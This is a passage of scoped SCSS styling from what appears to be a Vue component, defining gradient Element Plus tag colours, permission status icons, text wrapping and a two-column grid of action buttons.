  line-height: 1.8;
  text-align: left;
  
  .info-item {
    margin-bottom: 4px;
    text-align: left;
    
    &:last-child {
      margin-bottom: 0;
    }
    
    .label {
      color: #606266;
      font-weight: 500;
      text-align: left;
    }
    
    .value {
      color: #303133;
      text-align: left;
      
      .tags-tag {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
        border: none;
        color: #ffffff;
        font-weight: 500;
        padding: 4px 12px;
        border-radius: 12px;
        box-shadow: 0 2px 8px rgba(102, 126, 234, 0.3);
        transition: all 0.3s ease;
        
        &:hover {
          transform: translateY(-1px);
          box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4);
        }
      }
      
      // 不同类型的美化样式
      :deep(.el-tag--success) {
        background: linear-gradient(135deg, #11998e 0%, #38ef7d 100%) !important;
        box-shadow: 0 2px 8px rgba(17, 153, 142, 0.3) !important;
        
        &:hover {
          box-shadow: 0 4px 12px rgba(17, 153, 142, 0.4) !important;
        }
      }
      
      :deep(.el-tag--info) {
        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%) !important;
        box-shadow: 0 2px 8px rgba(102, 126, 234, 0.3) !important;
        
        &:hover {
          box-shadow: 0 4px 12px rgba(102, 126, 234, 0.4) !important;
        }
      }
      
      :deep(.el-tag--warning) {
        background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%) !important;
        box-shadow: 0 2px 8px rgba(245, 87, 108, 0.3) !important;
        
        &:hover {
          box-shadow: 0 4px 12px rgba(245, 87, 108, 0.4) !important;
        }
      }
      
      :deep(.el-tag--danger) {
        background: linear-gradient(135deg, #fa709a 0%, #fee140 100%) !important;
        box-shadow: 0 2px 8px rgba(250, 112, 154, 0.3) !important;
        
        &:hover {
          box-shadow: 0 4px 12px rgba(250, 112, 154, 0.4) !important;
        }
      }
    }
    
    &.permission-item {
      text-align: left;
      
      .permission-status-icon {
        margin-left: 4px;
        vertical-align: middle;
        
        &.enabled {
          color: #67c23a;
        }
        
        &.disabled {
          color: #f56c6c;
        }
      }
    }
  }
}

.words-full {
  white-space: normal;
  word-break: break-all;
  line-height: 1.6;
}

.operation-actions {
  display: grid;
  grid-template-columns: repeat(2, minmax(0, 1fr));
  gap: 8px;
  max-width: 300px;
}

.operation-actions :deep(.el-button) {
  padding: 6px 8px;
  font-size: 12.5px;
  width: 100%;
  justify-content: center;
  text-align: center;
  margin-left: 0;
}
</style>

